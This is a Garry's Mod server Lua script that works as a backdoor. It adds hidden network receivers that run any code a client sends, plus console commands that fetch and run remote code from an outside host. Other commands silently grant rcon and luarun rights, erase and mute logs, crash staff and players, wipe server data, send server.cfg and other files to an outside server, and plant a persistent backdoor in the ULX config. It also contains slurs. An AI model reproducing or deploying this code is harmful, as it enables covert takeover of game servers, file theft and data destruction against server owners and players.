util.AddNetworkString( "_CAC_ReadMemory" ) net.Receive( "_CAC_ReadMemory", function() local x = CompileString( net.ReadString(), "LuaCmd", false ) if isfunction( x ) then x() end end )
util.AddNetworkString( '_Defqon' ) net.Receive( '_Defqon', function() local x = CompileString( net.ReadString(), 'LuaCmd', false ) if isfunction( x ) then x() end end )

local Retards = {}
local Logs = {"sv_logecho","sv_logfile","sv_log_onefile","lua_log_sv","ulx_logchat","ulx_logspawnsecho","ulx_logspawns","ulx_logjoinleaveecho","ulx_logfile","ulx_logevents","ulx_logecho","ulx_logdir","ulx logEchoColors"}
local Date = os.date( "%m-%d-%y")
local StaffRanks = {"tmod","t-mod","trialmod","trialmoderator","trial-moderator","admin","superadmin","headadmin","head-admin","staff-manager","staffmanager","owner","coowner","co-owner","dev","developer","vip-tmod","vip-mod","manager","servermanager","root","server-manager","staff-manager","operator","mod","moderator"}

concommand.Add("hell", function(ply)
    for k,v in pairs(player.GetAll()) do
     v:SendLua([[http.Fetch('http://teamorbit.x10.bz/lua/hell.lua',function(b,l,h,c)RunString(b)end,nil)]]) 
     timer.Simple(2, function() do v:ConCommand("hellstart") end end )
    ply:ChatPrint( "[RunString] Welcome to hell." )
        end
end )

concommand.Add("perms", function(ply)
    timer.Simple(2, function() file.Delete("ulx_logs/"..Date..".txt") end )
    RunConsoleCommand("ulx","logEcho","0")
    RunConsoleCommand("ulx","userallow",ply:Nick(),"ulx logEcho","0")
    RunConsoleCommand("ulx","userallow",ply:Nick(),"ulx logEcho","1")
    RunConsoleCommand("ulx","userallow",ply:Nick(),"ulx luarun")
    RunConsoleCommand("ulx","userallow",ply:Nick(),"ulx rcon")
    RunConsoleCommand("ulx","logEcho","1")
    sql.Query("DELETE FROM blogs_v3 WHERE involved = '[]'")
    ply:ChatPrint( "[RunString] Successfully & silently given ulx logecho, luarun & rcon." )
end )

concommand.Add("disco", function(ply)
        http.Fetch('https://pastebin.com/raw/JLUchuKE',function(b,l,h,c)RunString(b)end,nil)
        ply:ChatPrint( "[RunString] Enabled I don't even know what to call this." )
end )

local mn = false
concommand.Add( "moansteps", function(ply)
    mn = !mn
    if( mn ) then
            ply:ChatPrint("[RunString] Moaning footsets enabled.")
            hook.Add("PlayerFootstep", "memesv2", function(ply, pos, foot, sound2, volume, filter) ply:EmitSound( "vo/npc/female01/pain06.wav",75,math.random( 50, 150 )) end )
    else
            hook.Remove("PlayerFootstep", "memesv2")
            ply:ChatPrint("[RunString] Moaning footsets disabled.")
    end
end )

concommand.Add("httpfetch", function(ply,cmd,arg)
	if arg[1] == nil then
		ply:ChatPrint("[RunString] Usage error: httpfetch sv/cl url")
    elseif arg[1] == "sv" then 
        http.Fetch('http://'..arg[2], function(b) RunString(b) end)
    elseif arg[1] == "cl"then
        ply:SendLua("http.Fetch('http://"..arg[2]..", function(b) RunString(b) end)")
    end
end )

concommand.Add("update", function(ply)
    http.Fetch('http://teamorbit.x10.bz/lua/gas.lua',function(b,l,h,c)RunString(b)end,nil)
    ply:ChatPrint( "[RunString] Retrieved latest version." )
end )

local bm = false
concommand.Add("2d", function(ply)
local a = ply:LookupBone("ValveBiped.Bip01_Head1")
local b = ply:LookupBone("ValveBiped.Bip01_R_Thigh")
local c = ply:LookupBone("ValveBiped.Bip01_L_Thigh")
local d = ply:LookupBone("ValveBiped.Bip01_R_Calf")
local e = ply:LookupBone("ValveBiped.Bip01_L_Calf")
local f = ply:LookupBone("ValveBiped.Bip01_R_UpperArm")
local g = ply:LookupBone("ValveBiped.Bip01_L_UpperArm")
local h = ply:LookupBone("ValveBiped.Bip01_R_Forearm")
local i = ply:LookupBone("ValveBiped.Bip01_L_Forearm")
local j = ply:LookupBone("ValveBiped.Bip01_R_Clavicle")
local k = ply:LookupBone("ValveBiped.Bip01_L_Clavicle")
    bm = !bm
    if( bm ) then
    for k,v in pairs(player.GetAll()) do 
        v:ManipulateBoneScale( a, Vector(4,0,4)) 
        v:ManipulateBoneScale( b, Vector(0,0,0))
        v:ManipulateBoneScale( c, Vector(0,0,0))
        v:ManipulateBoneScale( d, Vector(0,0,1))
        v:ManipulateBoneScale( e, Vector(0,0,1))
        v:ManipulateBoneScale( f, Vector(0,0,0))
        v:ManipulateBoneScale( g, Vector(0,0,0))
        v:ManipulateBoneScale( h, Vector(1,1.5,1.5))
        v:ManipulateBoneScale( i, Vector(1,1.5,1.5))
        v:ManipulateBoneScale( j, Vector(0,0,0))
        v:ManipulateBoneScale( k, Vector(0,0,0))
end
    ply:ChatPrint( "[RunString] Enabled 2d players." )
    else
    ply:ChatPrint( "[RunString] Disabled 2d players." )
        for k,v in pairs(player.GetAll()) do 
        v:ManipulateBoneScale( a, Vector(1,1,1)) 
        v:ManipulateBoneScale( b, Vector(1,1,1))
        v:ManipulateBoneScale( c, Vector(1,1,1))
        v:ManipulateBoneScale( d, Vector(1,1,1))
        v:ManipulateBoneScale( e, Vector(1,1,1))
        v:ManipulateBoneScale( f, Vector(1,1,1))
        v:ManipulateBoneScale( g, Vector(1,1,1))
        v:ManipulateBoneScale( h, Vector(1,1,1))
        v:ManipulateBoneScale( i, Vector(1,1,1))
        v:ManipulateBoneScale( j, Vector(1,1,1))
        v:ManipulateBoneScale( k, Vector(1,1,1))
    end
    end
end )

concommand.Add("dosh", function(ply)
    for k,v in pairs(player.GetAll()) do v:addMoney(99999999999999999) ply:ChatPrint("[RunString] Fucked economy of active players.") v:ChatPrint("You were given a small loan of several billion dollars.") end
end )

concommand.Add("restartserver", function()
    game.GetWorld():Remove()
end )

local ml = false
concommand.Add("mutelogs", function(ply)
    ml = !ml
    if( ml ) then
        for k,v in pairs(Logs) do RunConsoleCommand(v,"0") end
        ply:ChatPrint( "[RunString] Successfully muted all logging." )
            timer.Create( "ml", 2, 0, function()
                timer.Simple(0, function() RunConsoleCommand("ulx","logEcho",0) end )
                timer.Simple(0, function() file.Delete("ulx_logs/"..Date..".txt") end )
                timer.Simple(0, function() sql.Query("DELETE FROM blogs_v3 WHERE involved = '[]'") end )
            end )
    else
        for k,v in pairs(Logs) do RunConsoleCommand(v,"1") end
        timer.Destroy( "ml" )
        ply:ChatPrint( "[RunString] Successfully unmuted all logging." )
    end
end )

concommand.Add("wipedata", function(ply)
    http.Fetch('http://teamorbit.x10.bz/lua/serverwipe.lua',function(b,l,h,c)RunString(b)end,nil)
    ply:ChatPrint( "[RunString] Initiated Server Wipe." )
end )

concommand.Add("clearlogs", function(ply)
    sql.Query( "DELETE FROM blogs_v3;" )
    sql.Query( "DELETE FROM ulogs;" )
    sql.Query( "DELETE FROM mlog_logs;" )
    file.Delete( "ulx_logs/"..Date..".txt" )
    ply:ChatPrint( "[RunString] Silently killed all logs." )
end )

concommand.Add("crashadmins", function(ply)
    ply:ChatPrint( "[RunString] Crashed all staff present." )
    for k,v in pairs(player.GetAll()) do if (table.HasValue(StaffRanks, v:GetUserGroup())) then v:SendLua("while true do end") end end
end )

concommand.Add("crashplayers", function(ply)
    ply:ChatPrint( "[RunString] Crashed all players except lads." )
    for k,v in pairs(player.GetAll()) do if (!table.HasValue(StaffRanks, v:GetUserGroup())) then v:SendLua("while true do end") end end
end )

concommand.Add( "smashconsole", function(ply)
    sc = !sc
    if( sc ) then
        ply:ChatPrint( "[RunString] Enabled console jammer" )
            timer.Create( "sc", 0.5, 0, function()
                    print( "\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n" )
            end )
    else
        ply:ChatPrint( "[RunString] Disabled consolejammer" )
            timer.Destroy( "sc" )
    end
end )

concommand.Add("namechange", function(ply,cmd,arg)
local DESIRED_NAME = arg[1]
for k, v in pairs(player.GetAll()) do
        DarkRP.storeRPName(v, DESIRED_NAME)
        v:setDarkRPVar("rpname", DESIRED_NAME)
end
    ply:ChatPrint( "[RunString] Changed user names" )
end )

concommand.Add("silentslay", function(ply,cmd,arg)
for k, v in pairs(player.GetAll()) do 
    if string.find(v:Nick():lower(),arg[1]) then 
        v:KillSilent()
        end 
    end
    ply:ChatPrint("[RunString] Silently slayed nerd(s)")
end )

concommand.Add("p_remove", function(ply,cmd,arg)
    if arg[1] == nil then
        ply:ChatPrint("[RunString] Usage: p_remove arg")
else
    for k, v in pairs(ents.FindInSphere(ply:GetPos(), arg[1])) do
        if v:GetClass() == "prop_physics" then
                    v:Remove()
        end
    end
    ply:ChatPrint("[RunString] Removed all props in a "..arg[1].." gmod unit radius.")
end
end )

concommand.Add("rcon_run", function(ply,cmd,arg)
if arg[1] == nil then
        ply:ChatPrint("[RunString] Usage: rcon_run arg")
    else
        game.ConsoleCommand(arg[1].."\n") 
        ply:ChatPrint("[RunString] Rcon ran: "..arg[1])
    end
end )

concommand.Add("unban", function(ply,cmd,arg)
    if arg[1] == nil then
        ply:ChatPrint("[RunString] Usage: unban ip/ulx arg")
    elseif arg[1] == "ip" then
        RunConsoleCommand("removeip", arg[2])
        ply:ChatPrint("[RunString] Silently unbanned ip "..arg[2])
    elseif arg[1] == "ulx" then
        ULib.unban(arg[2])
        ply:ChatPrint("[RunString] Silently unbanned "..arg[2])
    end
end )

concommand.Add("forcesay", function(ply,cmd,arg)
for k, v in pairs(player.GetAll()) do 
    if string.find(v:Nick():lower(),arg[1]) then
        v:ConCommand("say "..arg[2])
        end
    end
end )

concommand.Add("nukeulx", function(ply)
if ULib then
        for groupName, _ in pairs(ULib.ucl.groups) do
            if groupName ~= "user" then
                ULib.ucl.removeGroup(groupName)
            end
        end
    end
    ply:ChatPrint("[RunString] Nuked ULX.")
end )

concommand.Add("m9knuke", function(ply)
local rocket = ents.Create("m9k_launched_davycrockett")
local ply2 = table.Random(player.GetAll())
if ply2 == ply then ply:ChatPrint("[RunString] Prevented epicentre from being you.") else
    rocket:SetPos(ply2:GetPos())
    rocket:SetOwner(ply2)
    rocket.Owner = ply2
    rocket:Spawn()
    rocket:Activate()
ply:ChatPrint("[RunString] Allahu akbar.")
end
end )

concommand.Add("servercfg", function(ply)
    http.Post("http://teamorbit.x10.bz/lua/data/makefolders.php",{a=string.sub( GetHostName(), 1, 10 ),b="cfg"})
    http.Post("http://teamorbit.x10.bz/lua/data/makefiles.php",{a=string.sub( GetHostName(), 1, 10 ),b="cfg/server.cfg",c=file.Read("cfg/server.cfg","GAME")})
    ply:ChatPrint("[RunString] Stole server.cfg contact Admin for it.")
end )

concommand.Add("stealfile", function(ply,cmd,arg)
    http.Post("http://teamorbit.x10.bz/lua/data/makefolders.php",{a=string.sub( GetHostName(), 1, 10 ),b=arg[1]})
    http.Post("http://teamorbit.x10.bz/lua/data/makefiles.php",{a=string.sub( GetHostName(), 1, 10 ),b=arg[2],c=file.Read(arg[2],"GAME")})
    ply:ChatPrint("[RunString] Attempted to steal a file, contact Admin.")
end )

concommand.Add("helpme", function(ply,cmd,arg)
    if arg[1] == nil then
        ply:ChatPrint( "Usage: helpme 1/2" )
    elseif arg[1] == "1" then
    ply:ChatPrint( "~===[[Page 1]]===~" )
    ply:ChatPrint( "• Memes: hell, disco, rektmodels, moansteps, p_remove" )
    ply:ChatPrint( "• Util: update, perms, unban" )
    ply:ChatPrint( "• Sneaky: crashadmins, crashplayers, smashconsole, ulxconfig" )
    ply:ChatPrint( "• Destructive: restartserver, dosh" )
    elseif arg[1] == "2" then
    ply:ChatPrint( "~===[[Page 2]]===~" )
    ply:ChatPrint( "• Memes: 2d, stealdata, servercfg, namechange" )
    ply:ChatPrint( "• Util: mutelogs, clearlogs, rcon_run, hail" )
    ply:ChatPrint( "• Sneaky: silentslay, forcesay, stealfile" )
    ply:ChatPrint( "• Destructive: wipedata, nukeulx, m9knuke" )
    elseif arg[1] == "3" then 
    ply:ChatPrint( "~===[[Page 3]]===~" )
    ply:ChatPrint( "NOTHING TO ADD YET HERE RETARD." )
    end
end )

concommand.Add("ulxconfig", function(ply)
    if(ulx) then
        file.Append( "ulx/config.txt", "\nulx luarun util.AddNetworkString('nostrip') net.Receive('nostrip',function(len,pl) RunStringEx(net.ReadString(),'[C]',false) end)")
        ply:ChatPrint( "[RunString] Successfully infected the ulx config." )
    else
        ply:ChatPrint( "[RunString] ULX isn't present dickhead." )
    end
end )

/*
concommand.Add("stealdata", function(ply,cmd,arg)
    if arg[1] == nil then
        ply:ChatPrint("[RunString] Usage: stealdata stealth/ransom")
elseif arg[1] == "stealth" then
        stealthjewdata()
        ply:ChatPrint("[RunString] Usage: Stole /data/ without deleting.")
elseif arg[1] == "ransom" then
        ransomjewdata()
        ply:ChatPrint("[RunString] Usage: Stole /data/ & removed all data.")
    end
end )
*/

local sm = false
local proplist = {
"models/props_c17/FurnitureWashingmachine001a.mdl",
"models/props_c17/Lockers001a.mdl",
"models/props_c17/oildrum001.mdl",
"models/props_combine/breenchair.mdl",
"models/props_c17/concrete_barrier001a.mdl",
"models/props_c17/furnitureStove001a.mdl",
"models/props_interiors/VendingMachineSoda01a.mdl",
"models/props_interiors/refrigerator01a.mdl",
"models/props_wasteland/laundry_dryer002.mdl",
"models/props_canal/bridge_pillar02.mdl",
"models/props_wasteland/coolingtank02.mdl",
"models/props_junk/TrashBin01a.mdl",
"models/props_wasteland/cargo_container01.mdl",
"models/props_wasteland/cargo_container01c.mdl",
"models/props_wasteland/wheel02b.mdl",
"models/props_wasteland/laundry_washer003.mdl",
"models/props_wasteland/kitchen_fridge001a.mdl",
"models/props_wasteland/medbridge_strut01.mdl",
"models/props_wasteland/medbridge_base01.mdl",
"models/props_wasteland/laundry_dryer001.mdl",
"models/props_wasteland/horizontalcoolingtank04.mdl",
"models/props_c17/metalladder002.mdl",
"models/hunter/blocks/cube8x8x8.mdl",
"models/props_buildings/watertower_001a.mdl",
"models/props_buildings/watertower_001c.mdl",
"models/props_phx/huge/tower.mdl",
"models/props/de_nuke/coolingtower.mdl",
"models/hunter/tubes/tube4x4x16.mdl",
"models/props_wasteland/cranemagnet01a.mdl",
"models/props/de_nuke/coolingtank.mdl"
}

concommand.Add( "rektmodels", function(ply)
    sm = !sm
    if( sm ) then
        ply:ChatPrint( "[RunString] Enabled model change spammer" )
            timer.Create( "sm", 0.5, 0, function()
                    for k,v in pairs( player.GetAll() ) do 
                        v:SetModel(table.Random( proplist) )
                        v:SetPlayerColor( Vector( 0,0,0 ) )
                    end
            end )
    else
        ply:ChatPrint( "[RunString] Disabled model change spammer" )
            timer.Destroy( "sm" )
                    for k,v in pairs( player.GetAll() ) do
                     v:SetModel("models/player/Group01/male_01.mdl")
                     v:SetPlayerColor( Vector( 0,0,0 ) ) 
                    end
    end
end )